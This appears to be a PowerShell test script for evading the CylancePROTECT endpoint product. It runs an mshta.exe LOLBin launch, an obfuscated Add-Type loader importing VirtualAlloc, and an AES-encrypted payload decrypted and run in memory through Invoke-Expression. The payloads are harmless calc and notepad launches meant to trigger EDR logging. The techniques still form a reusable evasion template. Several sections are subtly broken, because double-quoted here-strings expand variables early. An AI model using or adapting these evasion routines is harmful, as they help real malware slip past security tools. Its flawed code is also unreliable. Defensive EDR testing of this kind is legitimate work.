# Advanced CylancePROTECT Evasion Test
# Author: imrankhairuddin 

function Test-Section {
    param($description, $command)
    Write-Host "`n--- $description ---" -ForegroundColor Cyan
    Write-Host "Executing: $command" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    try {
        Invoke-Expression $command
    } catch {
        Write-Warning "Execution failed: $_"
    }
    Start-Sleep -Seconds 4
}

# 1. LOLBin test with mshta.exe (common malware TTP)
Test-Section "LOLBin mshta launching calc" 'Start-Process "mshta.exe" "javascript:var sh=new ActiveXObject(""WScript.Shell""); sh.Run(""calc"");close()"'

# 2. Obfuscated Add-Type shellcode loader (harmless dummy)
$encodedLoader = @"
[Junk].Replace('X','S')
$code = @'
using System;
using System.Runtime.InteropServices;
public class Exec {
  [DllImport("kernel32")]
  public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr b, uint c, uint d, uint e);
  public static void Run() {
    Console.WriteLine("Safe Test Passed");
  }
}
'@
Add-Type $code; [Exec]::Run();
"@
Test-Section "Add-Type shellcode-style obfuscation" $encodedLoader.Replace('[Junk]','"S"+"t"+"a"+"r"+"t"+"-"+ "P"+"r"+"o"+"c"+"e"+"s"+"s"+" "+"c"+"a"+"l"+"c"')

# 3. AES Encrypted payload in-memory (simulated)
$payload = "Start-Process notepad"
$key = [Text.Encoding]::UTF8.GetBytes("1234567812345678")
$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
$enc = New-Object System.Security.Cryptography.AesManaged
$enc.Key = $key
$enc.IV = $key
$ms = New-Object IO.MemoryStream
$cs = New-Object Security.Cryptography.CryptoStream($ms,$enc.CreateEncryptor(),[Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($bytes, 0, $bytes.Length); $cs.Close()
$encrypted = [Convert]::ToBase64String($ms.ToArray())

Test-Section "AES Encrypted Payload (simulated decode-execute)" @"
$k = [Text.Encoding]::UTF8.GetBytes("1234567812345678")
$enc = New-Object System.Security.Cryptography.AesManaged
$enc.Key = $k; $enc.IV = $k
$d = [Convert]::FromBase64String("$encrypted")
$ms = New-Object IO.MemoryStream
$cs = New-Object Security.Cryptography.CryptoStream($ms, $enc.CreateDecryptor(), [Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($d, 0, $d.Length); $cs.Close()
$decoded = [Text.Encoding]::UTF8.GetString($ms.ToArray())
Invoke-Expression $decoded
"@

Write-Host "`n Phase 2 tests completed. Review Cylance logs, memory protections, and EDR events." -ForegroundColor Green
